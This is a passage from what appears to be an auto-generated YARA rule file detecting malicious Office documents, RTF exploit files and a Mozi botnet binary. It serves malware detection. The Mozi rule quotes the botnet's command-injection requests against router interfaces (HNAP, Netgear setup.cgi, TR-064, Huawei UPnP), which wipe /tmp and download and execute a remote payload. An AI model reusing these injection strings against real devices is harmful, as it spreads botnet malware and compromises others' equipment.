      $s7 = "word/_rels/settings.xml.rels" fullword ascii
      $s8 = "UFhF0qe" fullword ascii
      $s9 = "customXml/item1.xmlPK" fullword ascii
      $s10 = "word/webSettings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s11 = "\\hg!c[" fullword ascii
      $s12 = "word/_rels/document.xml.relsPK" fullword ascii /* Goodware String - occured 3 times */
      $s13 = "word/_rels/document.xml.rels " fullword ascii /* Goodware String - occured 3 times */
      $s14 = "word/theme/theme1.xml" fullword ascii /* Goodware String - occured 3 times */
      $s15 = "word/settings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s16 = "word/theme/theme1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s17 = "word/fontTable.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s18 = "word/styles.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s19 = "word/document.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s20 = "word/webSettings.xml" fullword ascii /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x4b50 and filesize < 60KB and
      8 of them
}

rule sig_7402820a9e624e3c35ce2275dd9e6d73e906d976c8e4da6a140ca7cb7daab2cc {
   meta:
      description = "DOC - file 7402820a9e624e3c35ce2275dd9e6d73e906d976c8e4da6a140ca7cb7daab2cc.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "7402820a9e624e3c35ce2275dd9e6d73e906d976c8e4da6a140ca7cb7daab2cc"
   strings:
      $s1 = "word/_rels/webSettings.xml.rels" fullword ascii
      $s2 = "word/webSettings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s3 = "word/_rels/document.xml.relsPK" fullword ascii /* Goodware String - occured 3 times */
      $s4 = "word/_rels/document.xml.rels " fullword ascii /* Goodware String - occured 3 times */
      $s5 = "word/theme/theme1.xml" fullword ascii /* Goodware String - occured 3 times */
      $s6 = "word/settings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s7 = "word/theme/theme1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s8 = "word/fontTable.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s9 = "word/styles.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "word/document.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s11 = "word/webSettings.xml" fullword ascii /* Goodware String - occured 3 times */
      $s12 = "#aU j ?" fullword ascii
      $s13 = ";0V6*G4\"(" fullword ascii
      $s14 = "Bp{k2!#l" fullword ascii
      $s15 = "$v,95`" fullword ascii
      $s16 = "~S\\|?$" fullword ascii
      $s17 = "w'J?$\\" fullword ascii
      $s18 = "h$5Dr+W@" fullword ascii
      $s19 = ")F>$7I" fullword ascii
      $s20 = "Ej~.Q<" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 30KB and
      8 of them
}

rule sig_39f3c234507061d2b99efe08be1b29aeb3d0a0e699c733f5460172e3681b45a8 {
   meta:
      description = "DOC - file 39f3c234507061d2b99efe08be1b29aeb3d0a0e699c733f5460172e3681b45a8.xlsx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "39f3c234507061d2b99efe08be1b29aeb3d0a0e699c733f5460172e3681b45a8"
   strings:
      $s1 = "/iNnu:\"d" fullword ascii
      $s2 = "xl/embeddings/oleObject2.bin" fullword ascii
      $s3 = "xl/embeddings/oleObject1.bin" fullword ascii
      $s4 = "xl/printerSettings/printerSettings1.bin" fullword ascii
      $s5 = "xl/printerSettings/printerSettings2.bin" fullword ascii
      $s6 = "xl/diagrams/layout1.xml" fullword ascii
      $s7 = "xl/media/image6.emf" fullword ascii
      $s8 = "xl/worksheets/_rels/sheet1.xml.relsPK" fullword ascii
      $s9 = "xl/media/image7.emf" fullword ascii
      $s10 = "xl/drawings/drawing1.xml" fullword ascii
      $s11 = "xl/diagrams/data1.xml" fullword ascii
      $s12 = "xl/worksheets/sheet3.xml" fullword ascii
      $s13 = "xl/worksheets/_rels/sheet1.xml.rels" fullword ascii
      $s14 = "xl/diagrams/colors1.xml" fullword ascii
      $s15 = "xl/drawings/_rels/drawing1.xml.relsPK" fullword ascii
      $s16 = "xl/worksheets/_rels/sheet2.xml.rels" fullword ascii
      $s17 = "xl/media/image5.png" fullword ascii
      $s18 = "xl/diagrams/drawing1.xml" fullword ascii
      $s19 = "xl/drawings/_rels/drawing1.xml.rels" fullword ascii
      $s20 = "xl/printerSettings/printerSettings2.binPK" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      8 of them
}

rule sig_3b0579fb1efe349b78c99e17933b5be37b61fe3bb532e79ad33267b8c05c3672 {
   meta:
      description = "DOC - file 3b0579fb1efe349b78c99e17933b5be37b61fe3bb532e79ad33267b8c05c3672.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "3b0579fb1efe349b78c99e17933b5be37b61fe3bb532e79ad33267b8c05c3672"
   strings:
      $x1 = "<w:wordDocument xmlns:aml=\"http://schemas.microsoft.com/aml/2001/core\" xmlns:wpc=\"http://schemas.microsoft.com/office/word/20" ascii
      $s2 = "wordprocessingCanvas\" xmlns:cx=\"http://schemas.microsoft.com/office/drawing/2014/chartex\" xmlns:cx1=\"http://schemas.microsof" ascii
      $s3 = "rmats.org/markup-compatibility/2006\" xmlns:aink=\"http://schemas.microsoft.com/office/drawing/2016/ink\" xmlns:am3d=\"http://sc" ascii
      $s4 = "rosoft.com/office/word/2003/wordml/sp2\"/><o:DocumentProperties><o:Author>admin</o:Author><o:LastAuthor>alexpetrenko@mail.ru</o:" ascii
      $s5 = "schemas.microsoft.com/office/drawing/2016/5/9/chartex\" xmlns:cx4=\"http://schemas.microsoft.com/office/drawing/2016/5/10/charte" ascii
      $s6 = "bSBhcHBsaWNhdGlvbi92bmQuYWRvYmUucGhvdG9zaG9wIHRvIGltYWdlL3BuZyIvPiA8cmRmOmxp" fullword ascii /* base64 encoded string 'm application/vnd.adobe.photoshop to image/png"/> <rdf:li' */
      $s7 = "OTg4NTExLWRhNGEtNzI0OS05OTY2LWNhMmNiZGUxOThjYiIgc3RFdnQ6d2hlbj0iMjAyMS0wNC0w" fullword ascii /* base64 encoded string '988511-da4a-7249-9966-ca2cbde198cb" stEvt:when="2021-04-0' */
      $s8 = "PSJmcm9tIGltYWdlL3BuZyB0byBhcHBsaWNhdGlvbi92bmQuYWRvYmUucGhvdG9zaG9wIi8+IDxy" fullword ascii /* base64 encoded string '="from image/png to application/vnd.adobe.photoshop"/> <r' */
      $s9 = "aWQ6cGhvdG9zaG9wOmFiNWRjZmQzLWViNjctYjk0MS04Yzg0LTljMWYwZjhkMWU1MjwvcmRmOmxp" fullword ascii /* base64 encoded string 'id:photoshop:ab5dcfd3-eb67-b941-8c84-9c1f0f8d1e52</rdf:li' */
      $s10 = " xmlns:cx5=\"http://schemas.microsoft.com/office/drawing/2016/5/11/chartex\" xmlns:cx6=\"http://schemas.microsoft.com/office/dra" ascii
      $s11 = "m:vml\" xmlns:w10=\"urn:schemas-microsoft-com:office:word\" xmlns:w=\"http://schemas.microsoft.com/office/word/2003/wordml\" xml" ascii
      $s12 = "ft.com/office/drawing/2016/5/14/chartex\" xmlns:dt=\"uuid:C2F41010-65B3-11d1-A29F-00AA00C14882\" xmlns:mc=\"http://schemas.openx" ascii
      $s13 = "g/2016/5/12/chartex\" xmlns:cx7=\"http://schemas.microsoft.com/office/drawing/2016/5/13/chartex\" xmlns:cx8=\"http://schemas.mic" ascii
      $s14 = "<w:wordDocument xmlns:aml=\"http://schemas.microsoft.com/aml/2001/core\" xmlns:wpc=\"http://schemas.microsoft.com/office/word/20" ascii
      $s15 = "m/office/drawing/2015/9/8/chartex\" xmlns:cx2=\"http://schemas.microsoft.com/office/drawing/2015/10/21/chartex\" xmlns:cx3=\"htt" ascii
      $s16 = "wsp=\"http://schemas.microsoft.com/office/word/2003/wordml/sp2\" xmlns:sl=\"http://schemas.microsoft.com/schemaLibrary/2003/core" ascii
      $s17 = "=\"http://schemas.microsoft.com/office/word/2003/auxHint\" xmlns:wne=\"http://schemas.microsoft.com/office/word/2006/wordml\" xm" ascii
      $s18 = "AAAAAAAAAB" ascii /* base64 encoded string '       ' */
      $s19 = "</w:binData><v:shape id=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:467.25pt;height:107.25pt\"><v:imagedata src=\"wordml" ascii
      $s20 = "cm9tIGFwcGxpY2F0aW9uL3ZuZC5hZG9iZS5waG90b3Nob3AgdG8gaW1hZ2UvcG5nIi8+IDxyZGY6" fullword ascii /* base64 encoded string 'rom application/vnd.adobe.photoshop to image/png"/> <rdf:' */
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule f2762acdc3244d8adb11c318ac93b1ef63db750245a5f77e258af676d39e85b4 {
   meta:
      description = "DOC - file f2762acdc3244d8adb11c318ac93b1ef63db750245a5f77e258af676d39e85b4.xlsx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "f2762acdc3244d8adb11c318ac93b1ef63db750245a5f77e258af676d39e85b4"
   strings:
      $s1 = "EncryptedPackage2" fullword wide
      $s2 = "Y:\\'\\l3" fullword ascii
      $s3 = "[`E- L" fullword ascii
      $s4 = "OkiURY4" fullword ascii
      $s5 = "zJmrJ34" fullword ascii
      $s6 = "!!%l%1" fullword ascii
      $s7 = "_dL%_%" fullword ascii
      $s8 = "lclcxf" fullword ascii
      $s9 = "(Mtwt- " fullword ascii
      $s10 = "8|G/>= -" fullword ascii
      $s11 = "%Vz%fw0" fullword ascii
      $s12 = "# Q(OPf" fullword ascii
      $s13 = "Root Entry" fullword wide /* Goodware String - occured 46 times */
      $s14 = "Microsoft Enhanced RSA and AES Cryptographic Provider" fullword wide /* Goodware String - occured 153 times */
      $s15 = "QWLXA?7t" fullword ascii
      $s16 = "Qa5BVbhWXs" fullword ascii
      $s17 = "hZioz9=" fullword ascii
      $s18 = "*vwvE~Ec" fullword ascii
      $s19 = "upNM[rW" fullword ascii
      $s20 = "WhLEIwx" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 3000KB and
      8 of them
}

rule sig_8d0ff95405ce9a8a7e23a3d1bd7f7cab0bdeb2f13e88d6dd034a59cb7313742e {
   meta:
      description = "DOC - file 8d0ff95405ce9a8a7e23a3d1bd7f7cab0bdeb2f13e88d6dd034a59cb7313742e.xlsx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "8d0ff95405ce9a8a7e23a3d1bd7f7cab0bdeb2f13e88d6dd034a59cb7313742e"
   strings:
      $s1 = "EncryptedPackage2" fullword wide
      $s2 = "D- -N\\" fullword ascii
      $s3 = "QRV.RZb)" fullword ascii
      $s4 = "%.%s;U" fullword ascii
      $s5 = "%eYEup3" fullword ascii
      $s6 = "# 69XY" fullword ascii
      $s7 = "x>TY- " fullword ascii
      $s8 = "uox- y" fullword ascii
      $s9 = "YgvryU3" fullword ascii
      $s10 = ";u6q+ " fullword ascii
      $s11 = "~UF /n" fullword ascii
      $s12 = "k,^- wH" fullword ascii
      $s13 = "efKYNP5" fullword ascii
      $s14 = "Root Entry" fullword wide /* Goodware String - occured 46 times */
      $s15 = "Microsoft Enhanced RSA and AES Cryptographic Provider" fullword wide /* Goodware String - occured 153 times */
      $s16 = "StrongEncryptionDataSpace" fullword wide /* Goodware String - occured 1 times */
      $s17 = "Microsoft.Container.EncryptionTransform" fullword wide /* Goodware String - occured 1 times */
      $s18 = "-.XAR/l" fullword ascii
      $s19 = "iMdK-|*" fullword ascii
      $s20 = "OCUvj\"=" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 4000KB and
      8 of them
}

rule sig_41aa359ecdec67dd6362b8082d3d1fcc37bcca016e8f8b491bdca26a3516a085 {
   meta:
      description = "DOC - file 41aa359ecdec67dd6362b8082d3d1fcc37bcca016e8f8b491bdca26a3516a085.xlsx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "41aa359ecdec67dd6362b8082d3d1fcc37bcca016e8f8b491bdca26a3516a085"
   strings:
      $s1 = "EncryptedPackage2" fullword wide
      $s2 = "0xn@o:\\" fullword ascii
      $s3 = "H.Xa-  " fullword ascii
      $s4 = "~* Y>h" fullword ascii
      $s5 = "qqznhr" fullword ascii
      $s6 = "\\\\:cQcRw6r" fullword ascii
      $s7 = "\\CJkRjTA" fullword ascii
      $s8 = "+ (0jD" fullword ascii
      $s9 = "Root Entry" fullword wide /* Goodware String - occured 46 times */
      $s10 = "Microsoft Enhanced RSA and AES Cryptographic Provider" fullword wide /* Goodware String - occured 153 times */
      $s11 = "StrongEncryptionDataSpace" fullword wide /* Goodware String - occured 1 times */
      $s12 = "Microsoft.Container.EncryptionTransform" fullword wide /* Goodware String - occured 1 times */
      $s13 = "JxcXTTD" fullword ascii
      $s14 = "+.MBO\"" fullword ascii
      $s15 = "_(SBgL Xv" fullword ascii
      $s16 = "zKEZZD!" fullword ascii
      $s17 = "QOfgK<F" fullword ascii
      $s18 = "8sfhGC3k" fullword ascii
      $s19 = "PRmh\"k" fullword ascii
      $s20 = "wZqEeEJ" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 4000KB and
      8 of them
}

rule sig_5389f6cc8fe23e7e79110fd518666e72f1a6baf635168ef52afdc69f1288d524 {
   meta:
      description = "DOC - file 5389f6cc8fe23e7e79110fd518666e72f1a6baf635168ef52afdc69f1288d524.elf"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "5389f6cc8fe23e7e79110fd518666e72f1a6baf635168ef52afdc69f1288d524"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $x2 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope//\" s:encodingStyle=\"http://schemas.xmls" ascii
      $x3 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $x4 = "SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://%s:%d/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi" ascii
      $x5 = "SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://%s:%d/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi" ascii
      $x6 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"" ascii
      $x7 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"htt" ascii
      $x8 = "iption><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://%s:%d/Mo" ascii
      $x9 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii
      $x10 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii
      $x11 = "ver1>`cd /tmp && rm -rf * && /bin/busybox wget http://%s:%d/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><" ascii
      $x12 = "orks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMapp" ascii
      $x13 = ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/va" ascii
      $x14 = ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/va" ascii
      $s15 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://%s:%d/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron" fullword ascii
      $s16 = "GET /shell?cd+/tmp;rm+-rf+*;wget+http://%s:%d/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" fullword ascii
      $s17 = " -g %s:%d -l /tmp/huawei -r /Mozi.m;chmod -x huawei;/tmp/huawei huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDow" ascii
      $s18 = "lient>cd /var/; wget http://%s:%d/Mozi.m; chmod +x Mozi.m; ./Mozi.m</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMapping" ascii
      $s19 = "r/.x&&cd /var;rm -rf i;wget http://%s:%d/i ||curl -O http://%s:%d/i ||/bin/busybox wget http://%s:%d/i;chmod 777 i ||(cp /bin/ls" ascii
      $s20 = "r/.x&&cd /var;rm -rf i;wget http://%s:%d/bin.sh ||curl -O http://%s:%d/bin.sh ||/bin/busybox wget http://%s:%d/bin.sh;chmod 777 " ascii
   condition:
      uint16(0) == 0x457f and filesize < 900KB and
      1 of ($x*) and all of them
}

rule sig_2ada03cc7424b371b671f5c63e3c5644d747368287f6c68145e76de163967286 {
   meta:
      description = "DOC - file 2ada03cc7424b371b671f5c63e3c5644d747368287f6c68145e76de163967286.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "2ada03cc7424b371b671f5c63e3c5644d747368287f6c68145e76de163967286"
   strings:
      $s1 = "a185a3418" ascii /* base64 encoded string 'k_9k~5' */
      $s2 = ".'=`7!`@`8)<[`?,3[;`2`6`~1" fullword ascii /* hex encoded string 'x2a' */
      $s3 = "$4^&^-7[]*|" fullword ascii /* hex encoded string 'G' */
      $s4 = "&=%;%>?,/@2;?=^4^<" fullword ascii /* hex encoded string '$' */
      $s5 = "=.`/(%:&77.^]??" fullword ascii /* hex encoded string 'w' */
      $s6 = "`63@!^+??+2!?8" fullword ascii /* hex encoded string 'c(' */
      $s7 = "7?|9?/]@'20/" fullword ascii /* hex encoded string 'y ' */
      $s8 = ";56'2!*$?2#|?,3:!%=5" fullword ascii /* hex encoded string 'V"5' */
      $s9 = "$%<4-%?`!?7);^" fullword ascii /* hex encoded string 'G' */
      $s10 = ",|+?!,4@-4/%" fullword ascii /* hex encoded string 'D' */
      $s11 = ",4??0]-;;``%5~!/?8$>%5[%3?>4>~3??>|=" fullword ascii /* hex encoded string '@XSC' */
      $s12 = "|(#?'52@?" fullword ascii /* hex encoded string 'R' */
      $s13 = "?2]%+>%*[5(" fullword ascii /* hex encoded string '%' */
      $s14 = "2]*0.;??;?]" fullword ascii /* hex encoded string ' ' */
      $s15 = "~&;6'9>;#=5?>?`'5&=|$5;~)!<'?%1,,/;" fullword ascii /* hex encoded string 'iUQ' */
      $s16 = "/2=??5^#$" fullword ascii /* hex encoded string '%' */
      $s17 = "3]%:?*8+47);" fullword ascii /* hex encoded string '8G' */
      $s18 = "+'?^#$@3(],|2" fullword ascii /* hex encoded string '2' */
      $s19 = "<:61*<]&^'" fullword ascii /* hex encoded string 'a' */
      $s20 = ".6**)^(|=$[[1,4?1?/]5?`^/|9(?|?" fullword ascii /* hex encoded string 'aAY' */
   condition:
      uint16(0) == 0x5c7b and filesize < 300KB and
      8 of them
}

rule sig_71ab378df1ca7ad64f7fb4754d82d33df4d066af5e83a60ffd431726d51f1e3f {
   meta:
      description = "DOC - file 71ab378df1ca7ad64f7fb4754d82d33df4d066af5e83a60ffd431726d51f1e3f.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "71ab378df1ca7ad64f7fb4754d82d33df4d066af5e83a60ffd431726d51f1e3f"
   strings:
      $s1 = "@.(5?'2<=[:+_.?" fullword ascii /* hex encoded string 'R' */
      $s2 = "`)2%?>;%]?(?;4|?_>-^#*???`=$" fullword ascii /* hex encoded string '$' */
      $s3 = "*7^~>|!8*" fullword ascii /* hex encoded string 'x' */
      $s4 = "5_9=7`@5]$" fullword ascii /* hex encoded string 'Yu' */
      $s5 = "@*)6(-#1#)" fullword ascii /* hex encoded string 'a' */
      $s6 = "$3_4_7!-*$~1|-_%%?-3*(`=2<?>``2;+8?#%]@=?_%" fullword ascii /* hex encoded string '4q2(' */
      $s7 = "~/!2?||?~_)//*$;*>3[-%;~&($-" fullword ascii /* hex encoded string '#' */
      $s8 = "<<44$*/-%@" fullword ascii /* hex encoded string 'D' */
      $s9 = "%2^[9<?`5~^&82+768" fullword ascii /* hex encoded string ')X'h' */
      $s10 = "4:?+?*5%%-?@" fullword ascii /* hex encoded string 'E' */
      $s11 = "=!-?)^%3?%]6^2![[&$|`#!8|>." fullword ascii /* hex encoded string '6(' */
      $s12 = ".<3!:6%.6(/;?+,)^1~&/!2^=&*|#?+7<&*:" fullword ascii /* hex encoded string '6a'' */
      $s13 = "'@-/_&;-6#,3?4%0^)]:" fullword ascii /* hex encoded string 'c@' */
      $s14 = "3%^&?=%!|@?-:&*`-,_6=$?]" fullword ascii /* hex encoded string '6' */
      $s15 = "*??$;]$73:" fullword ascii /* hex encoded string 's' */
      $s16 = "56$]^)?5~2=$%,,`$]77[:" fullword ascii /* hex encoded string 'VRw' */
      $s17 = "?+&>~*??;675.?&676&6~8]-62!?&):%%?)?~+[]/`%=" fullword ascii /* hex encoded string 'gVvhb' */
      $s18 = " \\*\\bin000" fullword ascii
      $s19 = "\\objh7420{\\*\\objdata178972 {{{{{{{{{{{{{{{{{{{{{{{{{{{{{\\bin00            {\\*\\objdata178972            }            \\fiel" ascii
      $s20 = "fecdd5284" ascii
   condition:
      uint16(0) == 0x5c7b and filesize < 200KB and
      8 of them
}

rule sig_8573e361985adafebf286a7115b0ff783f3432defcb415d45df2c46f04104cfe {
   meta:
      description = "DOC - file 8573e361985adafebf286a7115b0ff783f3432defcb415d45df2c46f04104cfe.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "8573e361985adafebf286a7115b0ff783f3432defcb415d45df2c46f04104cfe"
   strings:
      $s1 = "update4435919244359192\\objw3623\\objh9842{\\*\\objdata893425 {{{{{\\bin0000        {\\*\\objdata893425        }        \\passwo" ascii
      $s2 = "[`3)!2_/&=6_(2?<`&>0?%%'8?8-{\\object65648964                            \\''                            \\objautlink34063390\\|" ascii
      $s3 = ";#@<?7.?<#:_3;" fullword ascii /* hex encoded string 's' */
      $s4 = "-2;=?,>8|~>,?;%>+%?<" fullword ascii /* hex encoded string '(' */
      $s5 = ";2!?=6/<@';?+" fullword ascii /* hex encoded string '&' */
      $s6 = "7=;=0??.!" fullword ascii /* hex encoded string 'p' */
      $s7 = "_#>|?3<?[.+=7;-~3943<$" fullword ascii /* hex encoded string '79C' */
      $s8 = "$[=3|95.4:=?(" fullword ascii /* hex encoded string '9T' */
      $s9 = "]?4[:4^%?&" fullword ascii /* hex encoded string 'D' */
      $s10 = "6?>`??$?%,*4`]&^" fullword ascii /* hex encoded string 'd' */
      $s11 = "5)``8:->'?3^7?^" fullword ascii /* hex encoded string 'X7' */
      $s12 = "'50&$5?1-%-]<&`>@" fullword ascii /* hex encoded string 'PQ' */
      $s13 = "_2*-/136?.]43:/@|7?-?`%_==5-" fullword ascii /* hex encoded string '!6Cu' */
      $s14 = "(705*@_1'_=-5>;!%5%<" fullword ascii /* hex encoded string 'pQU' */
      $s15 = "(4&&.@~'~`0.]?|5469!)?;=)$%4(?.2:4?*?5." fullword ascii /* hex encoded string '@TiBE' */
      $s16 = "6|0'%>$?~%3>?-5?~" fullword ascii /* hex encoded string '`5' */
      $s17 = "_'4:*[@+&8^`=_!<.?-" fullword ascii /* hex encoded string 'H' */
      $s18 = "%*])-&=$/2%7%" fullword ascii /* hex encoded string ''' */
      $s19 = "=$7??]%<2~" fullword ascii /* hex encoded string 'r' */
      $s20 = " \\*\\bin000" fullword ascii
   condition:
      uint16(0) == 0x5c7b and filesize < 300KB and
      8 of them
}

